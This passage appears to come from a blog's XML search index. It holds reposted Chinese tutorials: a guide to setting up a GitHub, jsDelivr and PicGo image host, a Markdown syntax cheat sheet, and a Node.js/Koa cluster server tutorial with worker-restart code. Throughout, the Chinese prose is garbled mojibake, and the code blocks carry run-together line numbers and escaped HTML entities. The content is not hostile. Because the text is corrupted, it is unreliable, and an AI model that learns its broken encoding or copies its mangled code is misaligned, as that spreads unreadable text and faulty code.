ã€ŠåŸ‹ç‚¹æ•°æ®åˆ†ææ¨¡å‹è®¾è®¡ã€‹ ã€ŠChromeæ’ä»¶ä¹‹æ•°æ®å¯è§†åŒ–ã€‹ ä½œè€…ï¼šæ”¿é‡‡äº‘å‰ç«¯å›¢é˜Ÿé“¾æ¥ï¼šhttps://juejin.im/post/5e3fb599f265da573f3563b9æ¥æºï¼šæ˜é‡‘è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github+jsDelivr+PicGo æ‰“é€ ç¨³å®šå¿«é€Ÿã€é«˜æ•ˆå…è´¹å›¾åºŠ]]></title>
    <url>%2F2020%2F02%2F18%2F%E5%85%B6%E4%BB%96%2FGithub%2BjsDelivr%2BPicGo%20%E6%89%93%E9%80%A0%E7%A8%B3%E5%AE%9A%E5%BF%AB%E9%80%9F%E3%80%81%E9%AB%98%E6%95%88%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/76947034 â— å‰è¨€å›¾åºŠæ˜¯ä¸ªå•¥ä¸œè¥¿å°±ä¸ç”¨è¿‡å¤šä»‹ç»äº†ï¼Œå…ˆæ¥å¯¹æ¯”ä¸€ä¸‹å„è·¯å›¾åºŠï¼š å¾®åšå›¾åºŠï¼šä»¥å‰ç”¨çš„äººæ¯”è¾ƒå¤šï¼Œä»2019å¹´4æœˆå¼€å§‹å¼€å¯äº†é˜²ç›—é“¾ï¼Œå‡‰å‡‰ SM.MSï¼šè¿è¥å››å¹´å¤šäº†ï¼Œä¹Ÿå˜å¾—è¶Šæ¥è¶Šæ…¢äº†ï¼Œåˆ°äº†æ™šä¸Šç›´æ¥æ‰“ä¸å¼€å›¾ç‰‡ï¼Œé€Ÿåº¦å ªå¿§ å…¶ä»–å°ä¼—å›¾åºŠï¼šéšæ—¶æœ‰æŒ‚æ‰çš„é£é™© Imgurç­‰å›½å¤–å›¾åºŠï¼šå›½å†…è®¿é—®é€Ÿåº¦å¤ªæ…¢ï¼Œéšæ—¶æœ‰è¢«å¢™çš„é£é™© å¤§å‚å‚¨å­˜æœåŠ¡ï¼šä¾‹å¦‚ä¸ƒç‰›äº‘ã€åˆæ‹äº‘ã€è…¾è®¯äº‘COSã€é˜¿é‡Œäº‘OSSç­‰ï¼Œæ“ä½œç¹çï¼Œåˆæ˜¯å®åè®¤è¯åˆæ˜¯åŸŸåå¤‡æ¡ˆçš„ï¼Œéº»çƒ¦ï¼Œè€Œä¸”è¿˜è¦èŠ±é’±ï¼ˆæœ‰é’±åˆä¸æ€•éº»çƒ¦çš„å½“æˆ‘æ²¡è¯´ï¼‰ å› æ­¤ï¼ŒGitHubå›¾åºŠæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œåˆ©ç”¨jsDelivr CDNåŠ é€Ÿè®¿é—®ï¼ˆjsDelivr æ˜¯ä¸€ä¸ªå…è´¹å¼€æºçš„ CDN è§£å†³æ–¹æ¡ˆï¼‰ï¼ŒPicGoå·¥å…·ä¸€é”®ä¸Šä¼ ï¼Œæ“ä½œç®€å•é«˜æ•ˆï¼ŒGitHubå’ŒjsDelivréƒ½æ˜¯å¤§å‚ï¼Œä¸ç”¨æ‹…å¿ƒè·‘è·¯é—®é¢˜ï¼Œä¸ç”¨æ‹…å¿ƒé€Ÿåº¦å’Œå®¹é‡é—®é¢˜ï¼Œè€Œä¸”å®Œå…¨å…è´¹ï¼Œå¯ä»¥è¯´æ˜¯ç›®å‰å…è´¹å›¾åºŠçš„æœ€ä½³è§£å†³æ–¹æ¡ˆï¼ â— æ–°å»ºGitHubä»“åº“ç™»å½•/æ³¨å†ŒGitHubï¼Œæ–°å»ºä¸€ä¸ªä»“åº“ï¼Œå¡«å†™å¥½ä»“åº“åï¼Œä»“åº“æè¿°ï¼Œæ ¹æ®éœ€æ±‚é€‰æ‹©æ˜¯å¦ä¸ºä»“åº“åˆå§‹åŒ–ä¸€ä¸ªREADME.mdæè¿°æ–‡ä»¶ â— ç”Ÿæˆä¸€ä¸ªTokenåœ¨ä¸»é¡µä¾æ¬¡é€‰æ‹©ã€Settingsã€‘-ã€Developer settingsã€‘-ã€Personal access tokensã€‘-ã€Generate new tokenã€‘ï¼Œå¡«å†™å¥½æè¿°ï¼Œå‹¾é€‰ã€repoã€‘ï¼Œç„¶åç‚¹å‡»ã€Generate tokenã€‘ç”Ÿæˆä¸€ä¸ªTokenï¼Œæ³¨æ„è¿™ä¸ªTokenåªä¼šæ˜¾ç¤ºä¸€æ¬¡ï¼Œè‡ªå·±å…ˆä¿å­˜ä¸‹æ¥ï¼Œæˆ–è€…ç­‰åé¢é…ç½®å¥½PicGoåå†å…³é—­æ­¤ç½‘é¡µ â— é…ç½®PicGoå‰å¾€ä¸‹è½½PicGoï¼Œå®‰è£…å¥½åå¼€å§‹é…ç½®å›¾åºŠ è®¾å®šä»“åº“åï¼šæŒ‰ç…§ã€ç”¨æˆ·å/å›¾åºŠä»“åº“åã€‘çš„æ ¼å¼å¡«å†™ è®¾å®šåˆ†æ”¯åï¼šã€masterã€‘ è®¾å®šTokenï¼šç²˜è´´ä¹‹å‰ç”Ÿæˆçš„ã€Tokenã€‘ æŒ‡å®šå­˜å‚¨è·¯å¾„ï¼šå¡«å†™æƒ³è¦å‚¨å­˜çš„è·¯å¾„ï¼Œå¦‚ã€ITRHX-PIC/ã€‘ï¼Œè¿™æ ·å°±ä¼šåœ¨ä»“åº“ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºITRHX-PICçš„æ–‡ä»¶å¤¹ï¼Œå›¾ç‰‡å°†ä¼šå‚¨å­˜åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ è®¾å®šè‡ªå®šä¹‰åŸŸåï¼šå®ƒçš„çš„ä½œç”¨æ˜¯ï¼Œåœ¨å›¾ç‰‡ä¸Šä¼ åï¼ŒPicGoä¼šæŒ‰ç…§ã€è‡ªå®šä¹‰åŸŸå+ä¸Šä¼ çš„å›¾ç‰‡åã€‘çš„æ–¹å¼ç”Ÿæˆè®¿é—®é“¾æ¥ï¼Œæ”¾åˆ°ç²˜è´´æ¿ä¸Šï¼Œå› ä¸ºæˆ‘ä»¬è¦ä½¿ç”¨jsDelivråŠ é€Ÿè®¿é—®ï¼Œæ‰€ä»¥å¯ä»¥è®¾ç½®ä¸ºã€https://cdn.jsdelivr.net/gh/ç”¨æˆ·å/å›¾åºŠä»“åº“å ã€‘ï¼Œå…³äºjsDelivræ˜¯å¦‚ä½•å¼•ç”¨èµ„æºçš„å¯ä»¥å‚è€ƒã€Šå…è´¹CDNï¼šjsDeliver+Githubã€‹ â— è¿›è¡Œé«˜æ•ˆåˆ›ä½œé…ç½®å¥½PicGoåï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œé«˜æ•ˆåˆ›ä½œäº†ï¼Œå°†å›¾ç‰‡æ‹–æ‹½åˆ°ä¸Šä¼ åŒºï¼Œå°†ä¼šè‡ªåŠ¨ä¸Šä¼ å¹¶å¤åˆ¶è®¿é—®é“¾æ¥ï¼Œå°†é“¾æ¥ç²˜è´´åˆ°åšæ–‡ä¸­å°±è¡Œäº†ï¼Œè®¿é—®é€Ÿåº¦æ æ çš„ï¼Œæ­¤å¤–PicGoè¿˜æœ‰ç›¸å†ŒåŠŸèƒ½ï¼Œå¯ä»¥å¯¹å·²ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œåˆ é™¤ï¼Œä¿®æ”¹é“¾æ¥ç­‰å¿«æ·æ“ä½œï¼ŒPicGoè¿˜å¯ä»¥ç”Ÿæˆä¸åŒæ ¼å¼çš„é“¾æ¥ã€æ”¯æŒæ‰¹é‡ä¸Šä¼ ã€å¿«æ·é”®ä¸Šä¼ ã€è‡ªå®šä¹‰é“¾æ¥æ ¼å¼ã€ä¸Šä¼ å‰é‡å‘½åç­‰ï¼Œæ›´å¤šåŠŸèƒ½è‡ªå·±å»æ¢ç´¢å§ï¼]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown æŒ‡å—]]></title>
    <url>%2F2020%2F02%2F18%2F%E5%85%B6%E4%BB%96%2FMarkdown%20%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[Markdownæ˜¯ä¸€å¥—ç®€æ´å¯è¯»æ€§æå¥½çš„æ ‡è®°è¯­è¨€ï¼Œéå¸¸é€‚åˆç”¨æ¥å†™ä½œã€‚æœ¬æ–‡åªåˆ—å‡ºäº†å¤§æ¦‚è¯­æ³•ï¼Œæ›´è¯¦ç»†çš„æ–‡æ¡£å¯ä»¥å‚è€ƒï¼š http://daringfireball.net/projects/markdown/syntax https://help.github.com/articles/github-flavored-markdown http://jianshu.io/p/q81RER æ ‡é¢˜1234567# ä¸€çº§æ ‡é¢˜## äºŒçº§æ ‡é¢˜â€¦â€¦###### å…­çº§æ ‡é¢˜ å¼•ç”¨1&gt; A man who stands for nothing will fall for anything. æ–‡å­—åŠ ç²—ã€æ–œä½“ã€åˆ é™¤ï¼ˆGFMï¼‰123456&lt;strong&gt;bold&lt;/strong&gt; text, __bold__ text*italic* text, _italic_ text~~deleted text~~æ³¨ï¼šè¡Œå†…ä½¿ç”¨æ—¶ç¬¦å·å‰éœ€æ·»åŠ ç©ºæ ¼ï¼Œå¦‚ &lt;strong&gt;è¿™æ ·ä¸€ä¸ª&lt;/strong&gt; ä¾‹å­ é“¾æ¥1[this is a link](http://name.com) å›¾ç‰‡1234![](http://name.com/pic.jpg)Chromeä¸‹æ”¯æŒç›´æ¥æ—ºæ—ºæˆªå›¾ç²˜è´´åˆ°ç¼–è¾‘å™¨é‡Œã€‚![screenshot](http://name.com/pic.jpg) è§†é¢‘æ³¨æ„ï¼š\1. è§†é¢‘åœ°å€è¯·ä½¿ç”¨httpsåè®®å¼€å¤´ï¼Œå¦åˆ™ä¼šå› ä¸ºå®‰å…¨é—®é¢˜å¯¼è‡´æ— æ³•æ’­æ”¾ã€‚\2. è¯·ä½¿ç”¨mp4/ogvç­‰æ ¼å¼çš„è§†é¢‘ï¼Œä¸è¦ä½¿ç”¨swfæ ¼å¼ã€‚ å…ˆæŠŠè§†é¢‘ä¸Šä¼ ï¼Œç„¶åæ›¿æ¢ä»£ç ä¸­çš„src=â€â€é‡Œçš„mp4åœ°å€ã€‚ 1&lt;video width="100%" height="560" controls="controls" src="//cloud.video.taobao.com//play/u/1573424185/p/1/e/6/t/1/50078178824.mp4"&gt;&lt;/video&gt; å¦‚æœè¦ è‡ªåŠ¨æ’­æ”¾ ï¼Œé‡‡ç”¨å¦‚ä¸‹ä»£ç ï¼š 1&lt;video width="100%" height="560" controls="controls" autoplay="autoplay" src="//cloud.video.taobao.com//play/u/1573424185/p/1/e/6/t/1/50078178824.mp4"&gt;&lt;/video&gt; å¦‚æœè¦è°ƒæ•´è§†é¢‘çš„é«˜åº¦å’Œå®½åº¦ï¼Œè¯·è°ƒæ•´ä»£ç é‡Œçš„heightå’Œwidthå±æ€§ åˆ—è¡¨12345- item1- item21. item12. item2 è¡¨æ ¼ï¼ˆGFMï¼‰123| foo | bar || --- | --- || yep | nop | ä»£ç 1`console.log(1)` ä»£ç å—ï¼ˆGFMï¼‰ï¼ˆæ”¯æŒè¯­æ³•é«˜äº®ï¼‰12345â€‹```jsfunction fn() &#123; alert(2)&#125;â€‹ 12## Latexå…¬å¼ $$ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$æˆ–ï¼š \[ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} \] è¡Œå†…å…¬å¼ï¼š $ x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} $æˆ–è€…ï¼š \( x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} \)æˆ–è€…ï¼š \$ x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} \$ x=âˆ’bÂ±âˆšb2âˆ’4ac2ax=âˆ’bÂ±b2âˆ’4ac2a è¡Œå†…å…¬å¼ï¼š\$ x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} \$ ## ç›¸å…³æ–‡ç«  * [markdown åŸºç¡€è¯­æ³•](http://xianbai.me/learn-md/article/syntax/headers.html)]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•åˆ›å»ºä¸€ä¸ªå¯é ç¨³å®šçš„WebæœåŠ¡å™¨]]></title>
    <url>%2F2020%2F02%2F14%2FNode.js%2F%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%AF%E9%9D%A0%E7%A8%B3%E5%AE%9A%E7%9A%84Web%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5c0cf55c51882530544f22e2 æœ¬ç¯‡æ–‡ç« ä¸»è¦è®²è¿°çš„æ˜¯å¦‚ä½•é€šè¿‡Nodeåˆ›å»ºä¸€ä¸ªç¨³å®šçš„webæœåŠ¡å™¨ï¼Œå¦‚æœä½ çœ‹åˆ°è¿™é‡Œæƒ³èµ·äº†pm2ç­‰å·¥å…·ï¼Œé‚£ä¹ˆä½ å¯ä»¥å…ˆæŠ›å¼ƒpm2ï¼Œè¿›æ¥çœ‹çœ‹ï¼Œå¦‚æœæœ‰å“ªäº›ä¸åˆé€‚çš„åœ°æ–¹ï¼Œæ³è¯·æ‚¨æŒ‡å‡ºã€‚ åˆ›å»ºä¸€ä¸ªç¨³å®šçš„webæœåŠ¡å™¨éœ€è¦è§£å†³ä»€ä¹ˆé—®é¢˜ã€‚ å¦‚ä½•åˆ©ç”¨å¤šæ ¸CPUèµ„æºã€‚ å¤šä¸ªå·¥ä½œè¿›ç¨‹çš„å­˜æ´»çŠ¶æ€ç®¡ç†ã€‚ å·¥ä½œè¿›ç¨‹çš„å¹³æ»‘é‡å¯ã€‚ è¿›ç¨‹é”™è¯¯å¤„ç†ã€‚ å·¥ä½œè¿›ç¨‹é™é‡é‡å¯ã€‚ å¦‚ä½•åˆ©ç”¨å¤šæ ¸CPUèµ„æºåˆ©ç”¨å¤šæ ¸CPUèµ„æºæœ‰å¤šç§è§£å†³åŠæ³•ã€‚ é€šè¿‡åœ¨å•æœºä¸Šéƒ¨ç½²å¤šä¸ªNodeæœåŠ¡ï¼Œç„¶åç›‘å¬ä¸åŒç«¯å£ï¼Œé€šè¿‡ä¸€å°Nginxè´Ÿè½½å‡è¡¡ã€‚ è¿™ç§åšæ³•ä¸€èˆ¬ç”¨äºå¤šå°æœºå™¨ï¼Œåœ¨æœåŠ¡å™¨é›†ç¾¤æ—¶ï¼Œé‡‡ç”¨è¿™ç§åšæ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸é‡‡ç”¨ã€‚ é€šè¿‡å•æœºå¯åŠ¨ä¸€ä¸ªmasterè¿›ç¨‹ï¼Œç„¶åforkå¤šä¸ªå­è¿›ç¨‹ï¼Œmasterè¿›ç¨‹å‘é€å¥æŸ„ç»™å­è¿›ç¨‹åï¼Œå…³é—­ç›‘å¬ç«¯å£ï¼Œè®©å­è¿›ç¨‹æ¥å¤„ç†è¯·æ±‚ã€‚ è¿™ç§åšæ³•ä¹Ÿæ˜¯Nodeå•æœºé›†ç¾¤æ™®éçš„åšæ³•ã€‚ æ‰€å¹¸çš„æ˜¯ï¼ŒNodeåœ¨v0.8ç‰ˆæœ¬æ–°å¢çš„clusteræ¨¡å—ï¼Œè®©æˆ‘ä»¬ä¸å¿…ä½¿ç”¨child_processä¸€æ­¥ä¸€æ­¥çš„å»å¤„ç†Nodeé›†ç¾¤è¿™ä¹ˆå¤šç»†èŠ‚ã€‚ æ‰€ä»¥æœ¬ç¯‡æ–‡ç« è®²è¿°çš„æ˜¯åŸºäºclusteræ¨¡å—è§£å†³ä¸Šè¿°çš„é—®é¢˜ã€‚ é¦–å…ˆåˆ›å»ºä¸€ä¸ªWebæœåŠ¡å™¨ï¼ŒNodeç«¯é‡‡ç”¨çš„æ˜¯Koaæ¡†æ¶ã€‚æ²¡æœ‰ä½¿ç”¨è¿‡çš„å¯ä»¥å…ˆå»çœ‹ä¸‹ ===&gt; ä¼ é€é—¨ ä¸‹é¢çš„ä»£ç æ˜¯åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„webæœåŠ¡éœ€è¦çš„é…ç½®ï¼Œçœ‹è¿‡ä¸Šç¯‡æ–‡ç« çš„å¯ä»¥å…ˆç›´æ¥è¿‡æ»¤è¿™å—ä»£ç ï¼Œç›´æ¥çœ‹åé¢ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798const Koa = require(&apos;koa&apos;);const app = new Koa();const koaNunjucks = require(&apos;koa-nunjucks-2&apos;);const koaStatic = require(&apos;koa-static&apos;);const KoaRouter = require(&apos;koa-router&apos;);const router = new KoaRouter();const path = require(&apos;path&apos;);const colors = require(&apos;colors&apos;);const compress = require(&apos;koa-compress&apos;);const AngelLogger = require(&apos;../angel-logger&apos;)const cluster = require(&apos;cluster&apos;);const http = require(&apos;http&apos;);class AngelConfig &#123; constructor(options) &#123; this.config = require(options.configUrl); this.app = app; this.router = require(options.routerUrl); this.setDefaultConfig(); this.setServerConfig(); &#125; setDefaultConfig() &#123; //é™æ€æ–‡ä»¶æ ¹ç›®å½• this.config.root = this.config.root ? this.config.root : path.join(process.cwd(), &apos;app/static&apos;); //é»˜è®¤é™æ€é…ç½® this.config.static = this.config.static ? this.config.static : &#123;&#125;; &#125; setServerConfig() &#123; this.port = this.config.listen.port; //cookieç­¾åéªŒè¯ this.app.keys = this.config.keys ? this.config.keys : this.app.keys; &#125;&#125;//å¯åŠ¨æœåŠ¡å™¨class AngelServer extends AngelConfig &#123; constructor(options) &#123; super(options); this.startService(); &#125; startService() &#123; //å¼€å¯gzipå‹ç¼© this.app.use(compress(this.config.compress)); //æ¨¡æ¿è¯­æ³• this.app.use(koaNunjucks(&#123; ext: &apos;html&apos;, path: path.join(process.cwd(), &apos;app/views&apos;), nunjucksConfig: &#123; trimBlocks: true &#125; &#125;)); this.app.use(async (ctx, next) =&gt; &#123; ctx.logger = new AngelLogger().logger; await next(); &#125;) //è®¿é—®æ—¥å¿— this.app.use(async (ctx, next) =&gt; &#123; await next(); // console.log(ctx.logger,&apos;loggerloggerlogger&apos;); const rt = ctx.response.get(&apos;X-Response-Time&apos;); ctx.logger.info(`angel $&#123;ctx.method&#125;`.green,` $&#123;ctx.url&#125; - `,`$&#123;rt&#125;`.green); &#125;); // å“åº”æ—¶é—´ this.app.use(async (ctx, next) =&gt; &#123; const start = Date.now(); await next(); const ms = Date.now() - start; ctx.set(&apos;X-Response-Time&apos;, `$&#123;ms&#125;ms`); &#125;); this.app.use(router.routes()) .use(router.allowedMethods()); // é™æ€èµ„æº this.app.use(koaStatic(this.config.root, this.config.static)); // å¯åŠ¨æœåŠ¡å™¨ this.server = this.app.listen(this.port, () =&gt; &#123; console.log(`å½“å‰æœåŠ¡å™¨å·²ç»å¯åŠ¨,è¯·è®¿é—®`,`http://127.0.0.1:$&#123;this.port&#125;`.green); this.router(&#123; router, config: this.config, app: this.app &#125;); &#125;); &#125;&#125;module.exports = AngelServer; åœ¨å¯åŠ¨æœåŠ¡å™¨ä¹‹åï¼Œå°†this.app.listenèµ‹å€¼ç»™this.serverï¼Œåé¢ä¼šç”¨åˆ°ã€‚ ä¸€èˆ¬æˆ‘ä»¬åšå•æœºé›†ç¾¤æ—¶ï¼Œæˆ‘ä»¬forkçš„è¿›ç¨‹æ•°é‡æ˜¯æœºå™¨çš„CPUæ•°é‡ã€‚å½“ç„¶æ›´å¤šä¹Ÿä¸é™å®šï¼Œåªæ˜¯ä¸€èˆ¬ä¸æ¨èã€‚ 12345678910111213141516171819202122232425262728293031323334353637const cluster = require(&apos;cluster&apos;);const &#123; cpus &#125; = require(&apos;os&apos;); const AngelServer = require(&apos;../server/index.js&apos;);const path = require(&apos;path&apos;);let cpusNum = cpus().length;//è¶…æ—¶let timeout = null;//é‡å¯æ¬¡æ•°let limit = 10;// æ—¶é—´let during = 60000;let restart = [];//masterè¿›ç¨‹if(cluster.isMaster) &#123; //forkå¤šä¸ªå·¥ä½œè¿›ç¨‹ for(let i = 0; i &lt; cpusNum; i++) &#123; creatServer(); &#125;&#125; else &#123; //workerè¿›ç¨‹ let angelServer = new AngelServer(&#123; routerUrl: path.join(process.cwd(), &apos;app/router.js&apos;),//è·¯ç”±åœ°å€ configUrl: path.join(process.cwd(), &apos;config/config.default.js&apos;) //é»˜è®¤è¯»å–config/config.default.js &#125;);&#125;// master.js//åˆ›å»ºæœåŠ¡è¿›ç¨‹ function creatServer() &#123; let worker = cluster.fork(); console.log(`å·¥ä½œè¿›ç¨‹å·²ç»é‡å¯pid: $&#123;worker.process.pid&#125;`);&#125; ä½¿ç”¨è¿›ç¨‹çš„æ–¹å¼ï¼Œå…¶å®å°±æ˜¯é€šè¿‡cluster.isMasterå’Œcluster.isWorkeræ¥è¿›è¡Œåˆ¤æ–­çš„ã€‚ ä¸»ä»è¿›ç¨‹ä»£ç å†™åœ¨ä¸€å—å¯èƒ½ä¹Ÿä¸å¤ªå¥½ç†è§£ã€‚è¿™ç§å†™æ³•ä¹Ÿæ˜¯Nodeå®˜æ–¹çš„å†™æ³•ï¼Œå½“ç„¶ä¹Ÿæœ‰æ›´åŠ æ¸…æ™°çš„å†™æ³•ï¼Œå€ŸåŠ©cluster.setupMasterå®ç°ï¼Œè¿™é‡Œä¸å»è¯¦ç»†è§£é‡Šã€‚ é€šè¿‡Nodeæ‰§è¡Œä»£ç ï¼Œçœ‹çœ‹ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆã€‚ é¦–å…ˆåˆ¤æ–­cluster.isMasteræ˜¯å¦å­˜åœ¨ï¼Œç„¶åå¾ªç¯è°ƒç”¨createServer(),fork4ä¸ªå·¥ä½œè¿›ç¨‹ã€‚æ‰“å°å·¥ä½œè¿›ç¨‹pidã€‚ clusterå¯åŠ¨æ—¶ï¼Œå®ƒä¼šåœ¨å†…éƒ¨å¯åŠ¨TCPæœåŠ¡ï¼Œåœ¨cluster.fork()å­è¿›ç¨‹æ—¶ï¼Œå°†è¿™ä¸ªTCPæœåŠ¡ç«¯socketçš„æ–‡ä»¶æè¿°ç¬¦å‘é€ç»™å·¥ä½œè¿›ç¨‹ã€‚å¦‚æœå·¥ä½œè¿›ç¨‹ä¸­å­˜åœ¨listen()ç›‘å¬ç½‘ç»œç«¯å£çš„è°ƒç”¨ï¼Œå®ƒå°†æ‹¿åˆ°è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡SO_REUSEADDRç«¯å£é‡ç”¨ï¼Œä»è€Œå®ç°å¤šä¸ªå­è¿›ç¨‹å…±äº«ç«¯å£ã€‚ è¿›ç¨‹ç®¡ç†ã€å¹³æ»‘é‡å¯ã€å’Œé”™è¯¯å¤„ç†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œmasterè¿›ç¨‹æ¯”è¾ƒç¨³å®šï¼Œå·¥ä½œè¿›ç¨‹å¹¶ä¸æ˜¯å¤ªç¨³å®šã€‚ å› ä¸ºå·¥ä½œè¿›ç¨‹å¤„ç†çš„æ˜¯ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç»™å·¥ä½œè¿›ç¨‹æ·»åŠ è‡ªåŠ¨é‡å¯çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯å¦‚æœå­è¿›ç¨‹å› ä¸ºä¸šåŠ¡ä¸­ä¸å¯æ§çš„åŸå› æŠ¥é”™äº†ï¼Œè€Œä¸”é˜»å¡äº†ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥åœæ­¢è¯¥è¿›ç¨‹æ¥æ”¶ä»»ä½•è¯·æ±‚ï¼Œç„¶åä¼˜é›…çš„å…³é—­è¯¥å·¥ä½œè¿›ç¨‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//è¶…æ—¶let timeout = null;//é‡å¯æ¬¡æ•°let limit = 10;// æ—¶é—´let during = 60000;let restart = [];if(cluster.isMaster) &#123; //forkå¤šä¸ªå·¥ä½œè¿›ç¨‹ for(let i = 0; i &lt; cpusNum; i++) &#123; creatServer(); &#125;&#125; else &#123; //worker let angelServer = new AngelServer(&#123; routerUrl: path.join(process.cwd(), &apos;app/router.js&apos;),//è·¯ç”±åœ°å€ configUrl: path.join(process.cwd(), &apos;config/config.default.js&apos;) //é»˜è®¤è¯»å–config/config.default.js &#125;); //æœåŠ¡å™¨ä¼˜é›…é€€å‡º angelServer.app.on(&apos;error&apos;, err =&gt; &#123; //å‘é€ä¸€ä¸ªè‡ªæ€ä¿¡å· process.send(&#123; act: &apos;suicide&apos; &#125;); cluster.worker.disconnect(); angelServer.server.close(() =&gt; &#123; //æ‰€æœ‰å·²æœ‰è¿æ¥æ–­å¼€åï¼Œé€€å‡ºè¿›ç¨‹ process.exit(1); &#125;); //5ç§’åé€€å‡ºè¿›ç¨‹ timeout = setTimeout(() =&gt; &#123; process.exit(1); &#125;,5000); &#125;);&#125;// master.js//åˆ›å»ºæœåŠ¡è¿›ç¨‹ function creatServer() &#123; let worker = cluster.fork(); console.log(`å·¥ä½œè¿›ç¨‹å·²ç»é‡å¯pid: $&#123;worker.process.pid&#125;`); //ç›‘å¬messageäº‹ä»¶ï¼Œç›‘å¬è‡ªæ€ä¿¡å·ï¼Œå¦‚æœæœ‰å­è¿›ç¨‹å‘é€è‡ªæ€ä¿¡å·ï¼Œåˆ™ç«‹å³é‡å¯è¿›ç¨‹ã€‚ //å¹³æ»‘é‡å¯ é‡å¯åœ¨å‰ï¼Œè‡ªæ€åœ¨åã€‚ worker.on(&apos;message&apos;, (msg) =&gt; &#123; //msgä¸ºè‡ªæ€ä¿¡å·ï¼Œåˆ™é‡å¯è¿›ç¨‹ if(msg.act == &apos;suicide&apos;) &#123; creatServer(); &#125; &#125;); //æ¸…ç†å®šæ—¶å™¨ã€‚ worker.on(&apos;disconnect&apos;, () =&gt; &#123; clearTimeout(timeout); &#125;);&#125; æˆ‘ä»¬åœ¨å®ä¾‹åŒ–AngelServeråï¼Œå¾—åˆ°angelServerï¼Œé€šè¿‡æ‹¿åˆ°angelServer.appæ‹¿åˆ°Koaçš„å®ä¾‹ï¼Œä»è€Œç›‘å¬Koaçš„erroräº‹ä»¶ã€‚ å½“ç›‘å¬åˆ°é”™è¯¯å‘ç”Ÿæ—¶ï¼Œå‘é€ä¸€ä¸ªè‡ªæ€ä¿¡å·process.send({ act: &#39;suicide&#39; })ã€‚ è°ƒç”¨cluster.worker.disconnect()æ–¹æ³•ï¼Œè°ƒç”¨æ­¤æ–¹æ³•ä¼šå…³é—­æ‰€æœ‰çš„serverï¼Œå¹¶ç­‰å¾…è¿™äº›serverçš„ â€˜closeâ€™äº‹ä»¶æ‰§è¡Œï¼Œç„¶åå…³é—­IPCç®¡é“ã€‚ è°ƒç”¨angelServer.server.close()æ–¹æ³•ï¼Œå½“æ‰€æœ‰è¿æ¥éƒ½å…³é—­åï¼Œé€šå¾€è¯¥å·¥ä½œè¿›ç¨‹çš„IPCç®¡é“å°†ä¼šå…³é—­ï¼Œå…è®¸å·¥ä½œè¿›ç¨‹ä¼˜é›…åœ°æ­»æ‰ã€‚ å¦‚æœ5sçš„æ—¶é—´è¿˜æ²¡æœ‰é€€å‡ºè¿›ç¨‹ï¼Œæ­¤æ—¶ï¼Œ5såå°†å¼ºåˆ¶å…³é—­è¯¥è¿›ç¨‹ã€‚ Koaçš„app.listenæ˜¯http.createServer(app.callback()).listen();çš„è¯­æ³•ç³–ï¼Œå› æ­¤å¯ä»¥è°ƒç”¨closeæ–¹æ³•ã€‚ workerç›‘å¬messageï¼Œå¦‚æœæ˜¯è¯¥ä¿¡å·ï¼Œæ­¤æ—¶å…ˆé‡å¯æ–°çš„è¿›ç¨‹ã€‚ åŒæ—¶ç›‘å¬disconnectäº‹ä»¶ï¼Œæ¸…ç†å®šæ—¶å™¨ã€‚ æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬åº”è¯¥ç›‘å¬processçš„uncaughtExceptionäº‹ä»¶ï¼Œå¦‚æœ Javascript æœªæ•è·çš„å¼‚å¸¸ï¼Œæ²¿ç€ä»£ç è°ƒç”¨è·¯å¾„åå‘ä¼ é€’å›äº‹ä»¶å¾ªç¯ï¼Œä¼šè§¦å‘ â€˜uncaughtExceptionâ€™ äº‹ä»¶ã€‚ ä½†æ˜¯Koaå·²ç»åœ¨middlewareå¤–è¾¹åŠ äº†tryCatchã€‚å› æ­¤åœ¨uncaughtExceptionæ•è·ä¸åˆ°ã€‚ 